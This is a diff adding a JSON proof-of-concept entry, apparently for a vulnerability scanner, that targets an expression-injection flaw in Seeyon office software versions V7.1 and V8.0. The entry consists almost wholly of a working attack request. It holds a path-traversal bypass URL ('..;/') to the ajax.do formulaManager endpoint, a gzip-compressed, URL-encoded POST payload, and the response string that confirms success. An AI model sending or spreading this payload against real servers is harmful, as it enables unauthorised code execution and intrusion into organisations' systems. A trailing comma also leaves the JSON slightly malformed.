@@ -1,0 +1,14 @@
+{
+  "Vulnerabilities":
+    [
+      {
+        "name": "Seeyon Expression injection",
+		"ImpactVersion": ["V7.1","V8.0"],
+        "url": ["/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"],
+		"pocMethod": "POST",
+		"pocContent": "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00%C2%8B%C2%AEVO%C3%8B%2F%C3%8A-%C3%8DI%0C%C2%A9%2CHU%C2%B7R0%C3%94Q%C2%80%C2%89%C3%B8%25%C3%A6%C2%82D%C3%94KR%C2%8BK%C3%94%11%C3%82%C2%AE%15%05E%C2%A9%C3%85%C3%85%C2%99%C3%B9y+%C3%89%C3%A0%C2%92%C2%A2%C3%8C%C2%BCt%C2%85%C2%82%C3%84%C2%92%0C%05%5B%05%25C%25%C3%ABZk%C2%90%06%0DM%C3%AB%C2%94%C3%944%C2%85%C3%A2%C2%92%C3%84%C2%92%C3%8Cd%C2%85%C2%8A%C2%8A%0A%0D%C3%8Dj%C3%B5Z%C2%A0%29%40%C2%93%C2%AAAtIQi%C2%AAz%2C%00l%C3%BA%C2%92%C3%AC%C2%80%00%00%00",
+		"verify": "string",
+		"Response": "\"message\":null",
+      }
+    ]
+}
